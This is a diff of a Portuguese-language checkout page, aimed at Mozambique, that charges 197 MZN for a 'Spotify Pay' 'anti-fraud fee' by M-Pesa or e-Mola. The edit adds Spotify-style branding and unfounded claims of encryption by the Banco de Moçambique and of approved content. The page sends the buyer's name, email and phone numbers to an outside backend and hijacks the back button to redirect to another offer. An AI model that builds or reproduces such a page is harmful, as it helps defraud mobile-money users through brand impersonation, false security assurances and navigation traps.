@@ -3,231 +3,371 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Checkout</title>
+  <title>Checkout - Spotify Pay</title>
   <style>
-    body {
+    * {
       margin: 0;
       padding: 0;
-      font-family: Arial, sans-serif;
-      background: #FFFFFF;
-    }
-    .container {
-      max-width: 480px;
-      margin: 40px auto;
-      background: #FFFFFF;
-      padding: 24px;
-      border-radius: 12px;
-      border: 1px solid #e0e0e0;
       box-sizing: border-box;
     }
-    .product-header {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      margin-bottom: 16px;
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+      background: #f5f5f5;
+      padding-top: 60px;
     }
-    .product-header img {
-      width: 80px;
-      border-radius: 8px;
-    }
-    .product-header .info .name {
-      font-weight: 600;
-      font-size: 18px;
-    }
-    .product-header .info .price {
-      font-weight: bold;
-      color: #01579b;
-      font-size: 20px;
-    }
-    .divider {
-      width: 90%;
-      height: 1px;
-      background: #e0e0e0;
-      margin: 20px auto;
-    }
-    label {
-      font-weight: 500;
-      margin-top: 12px;
-      display: block;
-    }
-    input[type="text"],
-    input[type="email"] {
-      width: 100%;
-      padding: 10px;
-      margin-top: 4px;
-      border: 1px solid #e0e0e0;
-      border-radius: 6px;
-      font-size: 16px;
-      background: #fff;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.03);
-      box-sizing: border-box;
-      position: relative;
-    }
-    .flag.mz {
-      background-image: url('https://flagcdn.com/w40/mz.png');
-      background-size: cover;
-      width: 24px;
-      height: 16px;
-      position: absolute;
-      top: 50%;
-      left: 12px;
-      transform: translateY(-50%);
-      pointer-events: none;
-    }
-    .input-wrapper {
-      position: relative;
-    }
-    .error-message {
-      color: red;
-      font-size: 13px;
-      margin-bottom: 8px;
-    }
-    .coupon-toggle {
-      color: #1976d2;
-      font-size: 14px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    .coupon-field {
-      display: none;
-      margin-top: 10px;
-      align-items: center;
-    }
-    .coupon-field input {
-      flex: 1;
-      margin-right: 10px;
-    }
-    .coupon-field button {
-      padding: 10px;
-      background: #1976d2;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    .section-title {
-      font-size: 15px;
-      font-weight: bold;
-      margin: 22px 0 10px;
-    }
-    .payment-options {
-      display: flex;
-      gap: 10px;
-    }
-    .payment-option {
-      flex: 1;
-      text-align: center;
-      border: 1px solid #ccc;
-      padding: 12px;
-      border-radius: 8px;
-      cursor: pointer;
-      background: white;
-      transition: all 0.2s;
-    }
-    .payment-option.selected {
-      border-color: #049D43;
-    }
-    .payment-option img {
-      max-width: 60px;
-      height: auto;
-      margin-bottom: 4px;
-    }
-    .phone-field {
-      margin-top: 16px;
-      display: none;
-    }
-    .secure-payment {
-      background: #e3f2fd;
-      color: #1976d2;
-      padding: 10px;
-      border: 1px solid #bbdefb;
-      border-radius: 6px;
-      font-weight: bold;
-      margin: 20px 0 12px;
-      text-align: center;
-    }
-    .secure-payment::before {
-      content: '\1F512';
-      margin-right: 6px;
-    }
-    .btn {
-      margin-top: 10px;
-      width: 100%;
-      background: #049D43;
-      color: white;
-      font-weight: bold;
-      padding: 14px;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    .terms {
-      font-size: 12px;
-      color: #777;
-      margin-top: 18px;
-      text-align: center;
-    }
+
     .top-bar {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
-      background: #c62828;
+      background: #1DB954;
       color: white;
-      padding: 10px 0;
+      padding: 12px 0;
       font-size: 16px;
       text-align: center;
-      font-weight: bold;
+      font-weight: 600;
       z-index: 1000;
-    }
-    .top-bar span {
-      font-weight: bold;
-    }
-    body {
-      padding-top: 50px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
     }
 
+    .top-bar .shield-icon {
+      font-size: 18px;
+      margin-right: 6px;
+    }
+
+    .top-bar span {
+      font-weight: 700;
+    }
+
+    .container {
+      max-width: 520px;
+      margin: 20px auto;
+      padding: 0 16px 40px;
+    }
+
+    /* Header do Produto */
+    .product-header {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .product-header img {
+      width: 70px;
+      height: 70px;
+      border-radius: 8px;
+      object-fit: cover;
+    }
+
+    .product-header .info {
+      flex: 1;
+    }
+
+    .product-header .info .name {
+      font-weight: 600;
+      font-size: 16px;
+      color: #191414;
+      margin-bottom: 6px;
+    }
+
+    .product-header .info .price {
+      font-weight: 700;
+      color: #1DB954;
+      font-size: 24px;
+    }
+
+    /* Container de Identificação */
+    .section-container {
+      background: white;
+      padding: 24px 20px;
+      border-radius: 12px;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .section-number {
+      background: #1DB954;
+      color: white;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 16px;
+    }
+
+    .section-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #191414;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      font-weight: 500;
+      font-size: 14px;
+      color: #535353;
+      margin-bottom: 8px;
+    }
+
+    input[type="text"],
+    input[type="email"] {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #d9dadc;
+      border-radius: 8px;
+      font-size: 16px;
+      background: white;
+      transition: border-color 0.2s;
+    }
+
+    input[type="text"]:focus,
+    input[type="email"]:focus {
+      outline: none;
+      border-color: #1DB954;
+    }
+
+    input.error {
+      border-color: #e22134;
+    }
+
+    .error-message {
+      color: #e22134;
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+
+    /* Métodos de Pagamento */
+    .payment-subtitle {
+      font-size: 14px;
+      color: #777;
+      margin-bottom: 16px;
+    }
+
+    .payment-options {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .payment-option {
+      border: 2px solid #e0e0e0;
+      padding: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      background: white;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .payment-option:hover {
+      border-color: #1DB954;
+    }
+
+    .payment-option.selected {
+      border-color: #1DB954;
+      background: #f0fdf4;
+    }
+
+    .payment-radio {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #d9dadc;
+      border-radius: 50%;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .payment-option.selected .payment-radio {
+      border-color: #1DB954;
+    }
+
+    .payment-option.selected .payment-radio::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 10px;
+      height: 10px;
+      background: #1DB954;
+      border-radius: 50%;
+    }
+
+    .payment-logo {
+      width: 50px;
+      height: 50px;
+      object-fit: contain;
+    }
+
+    .payment-name {
+      font-weight: 600;
+      font-size: 16px;
+      color: #191414;
+    }
+
+    .phone-field {
+      margin-top: 16px;
+      display: none;
+    }
+
+    /* Informações de Segurança */
+    .security-info {
+      background: white;
+      padding: 24px 20px;
+      border-radius: 12px;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+
+    .security-item {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+
+    .security-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .security-icon {
+      width: 48px;
+      height: 48px;
+      background: #f0fdf4;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      flex-shrink: 0;
+    }
+
+    .security-content h3 {
+      font-size: 16px;
+      font-weight: 700;
+      color: #191414;
+      margin-bottom: 4px;
+    }
+
+    .security-content p {
+      font-size: 14px;
+      color: #777;
+      line-height: 1.5;
+    }
+
+    /* Botão de Compra */
+    .btn-purchase {
+      width: 100%;
+      background: #1DB954;
+      color: white;
+      font-weight: 700;
+      padding: 16px;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background 0.2s;
+      box-shadow: 0 4px 12px rgba(29, 185, 84, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn-purchase:hover {
+      background: #1ed760;
+    }
+
+    .btn-purchase:disabled {
+      background: #b3b3b3;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      padding: 24px 16px;
+      color: #777;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .footer a {
+      color: #1DB954;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* Modal */
     .modal-overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.4);
-      display: flex;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
       align-items: center;
       justify-content: center;
-      z-index: 999;
+      z-index: 9999;
+      padding: 20px;
     }
+
     .modal-box {
       background: white;
-      padding: 24px 32px;
-      border-radius: 10px;
-      font-size: 18px;
+      padding: 32px 24px;
+      border-radius: 16px;
+      font-size: 16px;
       text-align: center;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+      max-width: 400px;
+      width: 100%;
     }
+
     .modal-box.success {
-      border: 2px solid #4caf50;
-      color: #2e7d32;
+      border-top: 4px solid #1DB954;
     }
+
     .modal-box.error {
-      border: 2px solid #f44336;
-      color: #c62828;
+      border-top: 4px solid #e22134;
     }
-    .modal-box.timeout {
-      border: 2px solid #ff9800;
-      color: #e65100;
-    }
+
+    /* Overlay de Processamento */
     #overlay-processando {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      display: flex;
+      background: rgba(0, 0, 0, 0.85);
+      display: none;
       justify-content: center;
       align-items: center;
       z-index: 9999;
@@ -242,7 +382,7 @@
     .loader-circle {
       width: 140px;
       height: 140px;
-      border: 10px solid #4ade80;
+      border: 10px solid #1DB954;
       border-top: 10px solid transparent;
       border-radius: 50%;
       animation: spin 1s linear infinite;
@@ -258,95 +398,155 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    /* Responsive */
+    @media (max-width: 640px) {
+      .container {
+        padding: 0 12px 40px;
+      }
+
+      .section-container {
+        padding: 20px 16px;
+      }
+
+      .product-header {
+        padding: 16px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="top-bar">
-    ⚠ Esta oferta expira em <span id="timer">10:00</span>
+    <span class="shield-icon">🛡️</span> PAGAMENTO 100% SEGURO
   </div>
 
   <div class="container">
+    <!-- Header do Produto -->
     <div class="product-header">
-      <img src="images/spoti.png" alt="Produto" />
+      <img src="images/spoti.png" alt="Spotify Pay" />
       <div class="info">
-        <div class="name">SPOTFY PAY ® - TAXA ANTI-FRAUDE</div>
+        <div class="name">SPOTIFY PAY ® - TAXA ANTI-FRAUDE</div>
         <div class="price">197,00 MZN</div>
       </div>
     </div>
 
-    <div class="divider"></div>
-
-    <label for="nome-input">Nome completo</label>
-    <input id="nome-input" type="text" />
-    <div id="nome-erro" class="error-message" style="display:none;">Por favor, preencha seu nome completo.</div>
-
-    <label for="email-input">E-mail</label>
-    <input id="email-input" type="email" />
-    <div id="email-erro" class="error-message" style="display:none;">Por favor, preencha seu e-mail.</div>
-    
-    <label for="whatsapp-input">Número de WhatsApp</label>
-    <input id="whatsapp-input" type="text" />
-    <div id="whatsapp-erro" class="error-message" style="display:none;">
-      Por favor, preencha o número de WhatsApp.
-    </div>
-
-    <div class="coupon-toggle" onclick="toggleCupom()">Tem um cupom de desconto?</div>
-    <div class="coupon-field" id="cupom-field">
-      <input type="text" placeholder="Digite o cupom" />
-      <button>Aplicar</button>
-    </div>
-
-    <div class="section-title">Método de pagamento</div>
-    <div class="payment-options">
-      <div class="payment-option" onclick="selectPayment(this, 'mpesa')">
-        <img src="images/mpesa.png" alt="M-Pesa" />
-        <div>M-Pesa</div>
+    <!-- Seção 1: Identificação -->
+    <div class="section-container">
+      <div class="section-header">
+        <div class="section-number">1</div>
+        <div class="section-title">Identifique-se</div>
       </div>
-      <div class="payment-option" onclick="selectPayment(this, 'emola')">
-        <img src="images/emola.png" alt="e-Mola" />
-        <div>e-Mola</div>
+
+      <div class="form-group">
+        <label for="nome-input">Nome e sobrenome</label>
+        <input id="nome-input" type="text" placeholder="Nome e sobrenome" />
+        <div id="nome-erro" class="error-message">Por favor, preencha seu nome completo.</div>
       </div>
-      <div class="payment-option" onclick="selectPayment(this, 'visa')">
-        <img src="images/visa (2) (1).png" alt="Visa/Mastercard" />
-        <div>Visa/Mastercard</div>
+
+      <div class="form-group">
+        <label for="email-input">E-mail</label>
+        <input id="email-input" type="email" placeholder="E-mail" />
+        <div id="email-erro" class="error-message">Por favor, preencha seu e-mail.</div>
+      </div>
+
+      <div class="form-group">
+        <label for="whatsapp-input">Telefone/WhatsApp</label>
+        <input id="whatsapp-input" type="text" placeholder="(00) 0 0000-0000" />
+        <div id="whatsapp-erro" class="error-message">Por favor, preencha o número de WhatsApp.</div>
       </div>
     </div>
 
-    <div class="phone-field" id="phone-section">
-      <label for="phone-input">Telefone</label>
-      <div>
-        <input id="phone-input" type="text" placeholder="84/85/86/87 xxxxxx" />
+    <!-- Seção 2: Métodos de Pagamento -->
+    <div class="section-container">
+      <div class="section-header">
+        <div class="section-number">2</div>
+        <div class="section-title">Pagamento</div>
       </div>
-      <div id="phone-erro" class="error-message" style="display:none;">Por favor, insira o número de telefone.</div>
+
+      <div class="payment-subtitle">Todas as transações são seguras e criptografadas.</div>
+
+      <div class="payment-options">
+        <div class="payment-option" onclick="selectPayment(this, 'mpesa')">
+          <div class="payment-radio"></div>
+          <img src="images/mpesa.png" alt="M-Pesa" class="payment-logo" />
+          <div class="payment-name">M-Pesa</div>
+        </div>
+
+        <div class="payment-option" onclick="selectPayment(this, 'emola')">
+          <div class="payment-radio"></div>
+          <img src="images/emola.png" alt="e-Mola" class="payment-logo" />
+          <div class="payment-name">e-Mola</div>
+        </div>
+      </div>
+
+      <div class="phone-field" id="phone-section">
+        <div class="form-group">
+          <label for="phone-input">Número de celular*</label>
+          <input id="phone-input" type="text" placeholder="84/85/86/87 xxxxxx" />
+          <div id="phone-erro" class="error-message">Por favor, insira o número de telefone.</div>
+        </div>
+      </div>
     </div>
 
-    <div class="secure-payment">Pagamento seguro</div>
+    <!-- Informações de Segurança -->
+    <div class="security-info">
+      <div class="security-item">
+        <div class="security-icon">🛡️</div>
+        <div class="security-content">
+          <h3>Dados protegidos</h3>
+          <p>Os seus dados são confidenciais e seguros.</p>
+        </div>
+      </div>
 
-    <button class="btn" id="pagar-btn">Finalizar compra 197,00 MZN</button>
-    <div id="pagamento-status" style="display:none; margin-top: 16px; text-align: center; font-weight: bold; color: #2c3e50;"></div>
-    <div class="terms">
-      Compra segura com criptografia. Ao finalizar, você aceita os termos.<br />
-      Nenhum dado sensível é armazenado.
+      <div class="security-item">
+        <div class="security-icon">🔒</div>
+        <div class="security-content">
+          <h3>Pagamento 100% Seguro</h3>
+          <p>As informações desta compra são criptografadas pelo Banco de Moçambique.</p>
+        </div>
+      </div>
+
+      <div class="security-item">
+        <div class="security-icon">🎓</div>
+        <div class="security-content">
+          <h3>Conteúdo Aprovado</h3>
+          <p>100% revisado e aprovado por profissionais</p>
+        </div>
+      </div>
+
+      <div class="security-item">
+        <div class="security-icon">✓</div>
+        <div class="security-content">
+          <h3>Garantia de 7 dias</h3>
+          <p>Você está protegido por uma garantia de satisfação.</p>
+        </div>
+      </div>
     </div>
-    <div style="font-size:13px; line-height:1.5; color:#666; margin-top:20px; text-align:center;">
-  <p>
-    Ao finalizar sua compra, você declara que leu e concorda com os 
-    <a href="https://visionpub.online/privacidade/" target="_blank" style="color:#1a73e8; text-decoration:none;">
-      Termos de Uso e Política de Privacidade
-    </a>.
-  </p>
-  <p style="margin-top:6px;">
-    © <script>document.write(new Date().getFullYear())</script> VisionPub. Todos os direitos reservados.
-  </p>
-</div>
 
+    <!-- Botão de Compra -->
+    <button class="btn-purchase" id="pagar-btn">
+      <span>🔒</span> Finalizar compra! MT 197,00
+    </button>
+
+    <!-- Footer -->
+    <div class="footer">
+      <p>
+        Ao finalizar sua compra, você declara que leu e concorda com os
+        <a href="https://visionpub.online/privacidade/" target="_blank">Termos de Uso e Política de Privacidade</a>.
+      </p>
+      <p style="margin-top:12px;">
+        © <script>document.write(new Date().getFullYear())</script> VisionPub. Todos os direitos reservados.
+      </p>
+    </div>
   </div>
 
-  <div id="modal" style="display:none;" class="modal-overlay">
+  <!-- Modal -->
+  <div id="modal" class="modal-overlay">
     <div id="modal-box" class="modal-box"></div>
   </div>
 
-  <div id="overlay-processando" style="display: none;">
+  <!-- Overlay de Processamento -->
+  <div id="overlay-processando">
     <div class="loader-container">
       <div class="loader-circle">
         <span id="contador">45</span>
@@ -362,7 +562,6 @@
       return `VP-${timestamp}-${random}`;
     }
 
-    // Gerar orderId único quando a página carrega
     let orderIdUnico = gerarOrderId();
     console.log('🆔 Order ID gerado:', orderIdUnico);
 
@@ -372,12 +571,7 @@
       document.getElementById('phone-section').style.display = 'block';
       const phoneInput = document.getElementById('phone-input');
       phoneInput.dataset.metodo = method;
-      phoneInput.placeholder = method === 'mpesa' ? 'EX: 84/85 xxxxxx' : method === 'emola' ? 'EX: 86/87 xxxxxx' : 'EX: 84/85/86/87 xxxxxx';
-    }
-
-    function toggleCupom() {
-      const el = document.getElementById('cupom-field');
-      el.style.display = el.style.display === 'flex' ? 'none' : 'flex';
+      phoneInput.placeholder = method === 'mpesa' ? 'EX: 84/85 xxxxxx' : 'EX: 86/87 xxxxxx';
     }
 
     function mostrarPopup(tipo, mensagem) {
@@ -401,16 +595,14 @@
       const whatsapp = document.getElementById('whatsapp-input');
       const metodo = phone.dataset.metodo;
       const pagarBtn = document.getElementById('pagar-btn');
-      const statusDiv = document.getElementById('pagamento-status');
       let erro = false;
 
-      [nome, email, phone].forEach(input => input.classList.remove('error'));
+      [nome, email, phone, whatsapp].forEach(input => input.classList.remove('error'));
       document.getElementById('nome-erro').style.display = 'none';
       document.getElementById('email-erro').style.display = 'none';
       document.getElementById('phone-erro').style.display = 'none';
       document.getElementById('whatsapp-erro').style.display = 'none';
 
-      // Validação básica
       if (!nome.value.trim()) {
         nome.classList.add('error');
         document.getElementById('nome-erro').style.display = 'block';
@@ -421,7 +613,7 @@
         document.getElementById('email-erro').style.display = 'block';
         erro = true;
       }
-      
+
       if (!whatsapp.value.trim()) {
         whatsapp.classList.add('error');
         document.getElementById('whatsapp-erro').style.display = 'block';
@@ -442,8 +634,6 @@
       const overlayIntervalo = mostrarOverlayProcessando(45);
 
       try {
-        const whatsapp = document.getElementById('whatsapp-input');
-        
         const resposta = await fetch('https://backenv2-production.up.railway.app/api/pagar', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -452,7 +642,7 @@
             whatsapp: whatsapp.value.trim(),
             amount: "197",
             reference: "opina",
-            orderId: orderIdUnico, // 🆔 ADICIONAR ORDERID
+            orderId: orderIdUnico,
             metodo: metodo,
             email: email.value.trim(),
             nome: nome.value.trim(),
@@ -471,7 +661,6 @@
         esconderOverlayProcessando();
 
         if (resultado.status === 'ok') {
-          // Salva dados pro 1-click dos upsells
           const _nome = nome.value.trim();
           const _email = email.value.trim();
           const _phoneRaw = numero;
@@ -485,10 +674,9 @@
           localStorage.setItem('email', _email);
           localStorage.setItem('nome', _nome);
           localStorage.setItem('whatsapp', _zap);
-          
+
           mostrarPopup('success', resultado.message || 'Compra aprovada com sucesso!');
-          
-          // 🎯 CRIAR TOKEN DE RASTREAMENTO E REDIRECIONAR
+
           try {
             const tokenResponse = await fetch('https://backenv2-production.up.railway.app/api/create-token', {
               method: 'POST',
@@ -507,21 +695,18 @@
             });
 
             const tokenResult = await tokenResponse.json();
-            
+
             if (tokenResult.status === 'ok') {
-              // Redirecionar com token
               setTimeout(() => {
                 window.location.href = `https://visionpub.online/up1/?t=${tokenResult.token}`;
               }, 3000);
             } else {
-              // Fallback sem token
               setTimeout(() => {
                 window.location.href = "https://visionpub.online/up1/";
               }, 3000);
             }
           } catch (tokenErr) {
             console.error('❌ Erro ao criar token:', tokenErr);
-            // Fallback sem token
             setTimeout(() => {
               window.location.href = "https://visionpub.online/up1/";
             }, 3000);
@@ -558,28 +743,6 @@
       return false;
     }
 
-    // Timer
-    let tempoRestante = 600;
-
-    function atualizarTimer() {
-      const timerEl = document.getElementById('timer');
-      if (!timerEl) return;
-
-      const minutos = Math.floor(tempoRestante / 60);
-      const segundos = tempoRestante % 60;
-
-      if (tempoRestante <= 0) {
-        document.querySelector('.top-bar').innerHTML = "⛔ A contagem chegou ao 00:00! Oferta encerrada.";
-        return;
-      }
-
-      timerEl.textContent = `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
-      tempoRestante--;
-    }
-
-    setInterval(atualizarTimer, 1000);
-    atualizarTimer();
-
     function mostrarOverlayProcessando(segundos) {
       const overlay = document.getElementById('overlay-processando');
       const contador = document.getElementById('contador');
@@ -604,38 +767,20 @@
     function esconderOverlayProcessando() {
       document.getElementById('overlay-processando').style.display = 'none';
     }
+
+    // Back Redirect
+    (function() {
+      const backUrl = "https://visionpub.online/back/";
+      history.pushState(null, null, location.href);
+
+      window.onpopstate = function() {
+        location.replace(backUrl);
+      };
+
+      window.addEventListener("pageshow", function(e) {
+        if (e.persisted) location.replace(backUrl);
+      });
+    })();
   </script>
-  <script>
-// ===== BACK REDIRECT =====
-// impede que o botão "voltar" saia do checkout e leva para tua oferta especial
-(function() {
-  const backUrl = "https://visionpub.online/back/";
-
-  // empurra um novo estado para o histórico
-  history.pushState(null, null, location.href);
-
-  window.onpopstate = function() {
-    // redireciona ao tentar voltar
-    location.replace(backUrl);
-  };
-
-  // segurança extra em Android/iOS (caso use gesture back)
-  window.addEventListener("pageshow", function(e) {
-    if (e.persisted) location.replace(backUrl);
-  });
-})();
-</script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
